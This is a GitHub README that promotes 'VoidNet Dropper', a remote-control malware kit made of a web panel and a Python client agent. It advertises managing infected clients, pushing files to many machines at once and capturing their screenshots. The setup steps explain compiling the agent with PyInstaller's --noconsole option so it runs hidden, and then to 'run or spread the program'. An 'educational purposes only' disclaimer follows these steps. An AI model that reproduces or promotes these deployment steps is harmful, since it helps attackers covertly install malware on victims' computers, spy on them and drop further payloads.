<h1 align="center"> VoidNet Dropper </h1>
<p align="center"> <kbd> <img src="https://raw.githubusercontent.com/xrtnx/VoidNet-Dropper/refs/heads/main/logo.png" width="420"> </kbd><br><br>

<h2 align="center"> Created by; </h1>
<p align="center"><a href="https://t.me/VOlDNET" target="_blank">VoidNet</a></p>
<p align="center"> <kbd> <img src="https://github.com/xrtnx/VoidNet-Dropper/blob/main/7655a679a3ec2af72304fc9d4fd94680.jpg?raw=true" width="260"> </kbd><br><br>

<br>

<h2 align="center"> 🤖 Features </h2>

- **Dashboard:** Get a quick overview of total clients, pending tasks, completed tasks, and screenshots.
- **Client Management:** View all connected clients, their status, machine name, IP address, and last seen time.
- **File Dropper:** Upload and deploy files to one or multiple clients simultaneously.
- **Screenshot Viewer:** Remotely capture and view screenshots from clients.
- **Task Logs:** Keep track of all the tasks performed, including file drops and their status.

<br>

<h2 align="center"> ⬇️ Setup </h2>

### Web Panel Setup

1.  **Download the panel and Python Script**
[Download](https://github.com/xrtnx/VoidNet-Dropper/releases/download/Releases/VoidNet.Dropper.zip)
2.  **Upload to your web server**
    Upload the contents of the `web-panel` directory to the public directory of your web server (e.g., `/var/www/html`).
3.  **Run the installer**
    Navigate to the installation URL (e.g., `http://your-domain.com/install.php`) and fill in the database and admin account details.
    <div align="center"><img style="display: block; margin-left: auto; margin-right: auto; width: 65%;" src="https://github.com/xrtnx/VoidNet-Dropper/blob/main/Install.png?raw=true"></img></div>
4.  **Login**
    Once the installation is complete, you will be redirected to the login page.
   <div align="center"><img style="display: block; margin-left: auto; margin-right: auto; width: 65%;" src="https://github.com/xrtnx/VoidNet-Dropper/blob/main/Login.png?raw=true"></img></div>

### Client Agent Setup

1.  **Configure the agent**
    Open the `client.py` file and change the `PANEL_URL` variable to your web panel's URL.

2. **Compile with Pyinstaller**
   Go into the terminal and run pyinstaller `--onefile --noconsole client.py`

3.  **Run or spread the program**
    Once you have finished compiling it you can check if it connects successfully!

<br>

<h2 align="center"> 🖼️ Pictures </h2>

<div align="center">
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://github.com/xrtnx/VoidNet-Dropper/blob/main/Dashboard.png?raw=true"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://github.com/xrtnx/VoidNet-Dropper/blob/main/Clients.png?raw=true"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://github.com/xrtnx/VoidNet-Dropper/blob/main/Screenshots.png?raw=true"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://github.com/xrtnx/VoidNet-Dropper/blob/main/Logs.png?raw=true"></img>
</div>

<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">

<h2 align="center"> ⚠️ Disclaimer </h2>

This tool is for educational purposes only. It is coded for you to see how your security is threatened and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. **Educational purpose only!**

<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
